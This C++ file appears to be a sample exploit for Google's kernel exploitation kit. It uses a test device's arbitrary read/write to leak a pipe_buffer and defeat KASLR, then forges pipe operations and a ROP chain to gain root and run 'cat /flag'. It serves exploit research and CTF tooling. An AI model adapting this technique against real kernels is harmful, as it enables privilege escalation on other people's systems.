// Copyright 2025 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <stdio.h>

#include <cassert>
#include <cerrno>

#include <xdk/core.h>
#include <xdk/postrip.h>
#include <xdk/xdk_device/xdk_device.h>

INCBIN(target_db, "target_db.kxdb");

XdkDevice xdkdev;

uint64_t alloc_victim_pipe(pipefds pipefds) {
    auto pipeMallocLog = xdkdev.InstallKprobe("__kmalloc", 1, CALL_LOG, "create_pipe_files");

    Syscalls::pipe(pipefds);
    write(pipefds[1], "pwn", 3);

    auto callLogs = pipeMallocLog->GetCallLogs(true);
    if (callLogs.size() != 1)
        throw ExpKitError("expected one pipe() malloc call");
    uint64_t pipe_addr = callLogs[0].return_value;
    xdkdev.RemoveKprobe(pipeMallocLog);

    return pipe_addr;
}

std::vector<uint8_t> trigger_vuln_arb_read(uint64_t addr, uint64_t size) {
    return xdkdev.Read(addr, size);
}

void trigger_vuln_arb_write(uint64_t addr, const std::vector<uint8_t>& data) {
    xdkdev.Write(addr, data);
}

void win() {
    puts("[+] Returned from kernel");
    puts("[+] Testing access as root:");
    const char *sh_args[] = {"sh", "-c", "id; cat /flag", NULL};
    int ret = execve("/bin/sh", (char**)sh_args, NULL);
    printf("[-] execve failed ret = %d, errno = %d, exiting...\n", ret, errno);
    _exit(1);
}

int main(int argc, const char** argv) {
    TargetDb kxdb("target_db.kxdb", target_db);
    auto target = kxdb.AutoDetectTarget();
    printf("[+] Running on target: %s %s\n", target.GetDistro().c_str(), target.GetReleaseName().c_str());

    pipefds fds;
    printf("[+] Creating victim pipe...\n");
    auto victim_pipe_addr = alloc_victim_pipe(fds);
    printf("[+] Victim pipe address = 0x%lx\n", victim_pipe_addr);

    auto pipe_buf_size = target.GetStructSize("pipe_buffer");
    auto pipe_leak_buf = trigger_vuln_arb_read(victim_pipe_addr, pipe_buf_size);
    auto pipe_leak = LeakedBuffer(target, pipe_leak_buf);
    auto pipe_ops = pipe_leak.GetField("pipe_buffer", "ops");
    printf("[+] Leaked anon_pipe_buf_ops = 0x%lx\n", pipe_ops);

    auto kaslr_base = pipe_ops - target.GetSymbolOffset("anon_pipe_buf_ops");
    printf("[+] KASLR base = 0x%lx\n", kaslr_base);
    check_kaslr_base(kaslr_base);

    printf("[+] ROP chain:\n");
    RopChain rop(target, kaslr_base);
    rop.AddRopAction(RopActionId::COMMIT_INIT_TASK_CREDS);
    RopUtils::Ret2Usr(rop, (void*)win);
    HexDump::Print(rop.GetData());

    printf("[+] Preparing fake pipe_buffer and ops\n");
    Payload payload(1024);

    // Put the fake pipe_buf_operations structure after the pipe_buffer structure.
    // TODO(feat): PayloadBuilder could automatically find an empty spot for this.
    uint64_t fake_ops_offs = pipe_buf_size;
    uint64_t release_offs = target.GetFieldOffset("pipe_buf_operations", "release");
    // Set pipe_buffer.ops to the address of our fake pipe_buf_operations address.
    payload.Set(target.GetFieldOffset("pipe_buffer", "ops"), victim_pipe_addr + fake_ops_offs);

    PayloadBuilder builder(target.GetPivots(), kaslr_base);
    // The RSI register points to our payload, and there is a function pointer (pipe_buf_operations.release in
    //   this case) at offset "fake_ops_offs + release_offs" which can be triggered for RIP control.
    builder.AddPayload(payload, Register::RSI, fake_ops_offs + release_offs);
    builder.SetRopShift(0x100);
    builder.AddRopChain(rop);
    if(!builder.Build())
      exit(-1);

    builder.PrintDebugInfo();

    printf("[+] Payload:\n");
    HexDump::Print(payload.GetUsedData());

    printf("[+] Overwriting our victim pipe_buffer structure with ARB write\n");
    trigger_vuln_arb_write(victim_pipe_addr, payload.GetUsedData());

    printf("[+] Testing access as non-root user:\n");
    system("id; cat /flag");

    printf("[+] Closing pipes, triggering RIP control\n");
    close(fds[0]);
    close(fds[1]);
    return 0;
}
